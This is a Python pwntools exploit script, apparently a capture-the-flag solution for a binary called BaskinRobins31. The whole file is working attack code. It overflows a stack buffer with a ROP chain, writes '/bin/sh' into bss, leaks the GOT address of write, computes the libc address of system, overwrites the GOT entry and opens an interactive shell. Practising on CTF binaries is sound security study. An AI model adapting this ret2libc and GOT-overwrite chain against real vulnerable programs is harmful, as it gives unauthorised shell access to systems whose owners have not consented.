#!/usr/bin/env python2
# coding: utf-8

from pwn import *

filename = './BaskinRobins31'
e = ELF(filename)
p = None

rdi = 0x0000000000400bc3
rdirsirdx = 0x000000000040087a

def set_number(payload):
    p.recvuntil('How many numbers do you want to take ? (1-3)\n')
    p.send(payload)

    for _ in range(payload.count('\x0a')):
        p.recvline()
    p.recvline()

def main():
    global p
    p = process(e.path)

    bss = e.bss() + 0x40
    log.success('bss : %#x' % bss)

    binsh = '///////bin/sh\x00'

    libc = e.libc
    offset = libc.symbols['write'] - libc.symbols['system']

    log.success('offset : %#x' % offset)

    payload = '1'
    payload += 'A' * (0xb0 - 1)
    payload += 'B' * 8
    payload += p64(rdirsirdx)
    payload += p64(0)
    payload += p64(bss)
    payload += p64(len(binsh))
    payload += p64(e.plt['read'])

    print 'read(0, %#x, %d);' % (bss, len(binsh))

    payload += p64(rdirsirdx)
    payload += p64(1)
    payload += p64(e.got['write'])
    payload += p64(8)
    payload += p64(e.plt['write'])

    print 'write(1, %#x, 8)' % e.got['write']

    payload += p64(rdirsirdx)
    payload += p64(0)
    payload += p64(e.got['write'])
    payload += p64(8)
    payload += p64(e.plt['read'])

    print 'read(0, %#x, 8);' % e.got['write']

    payload += p64(rdi)
    payload += p64(bss)
    payload += p64(e.plt['write'])

    print 'system(%#x);' % bss

    set_number(payload)

    p.send(binsh)
    write = u64(p.recv(8))
    system = write - offset

    log.success('leaked &system : %#x' % system)
    p.send(p64(system))

    p.interactive()


if __name__ == '__main__':
    main()

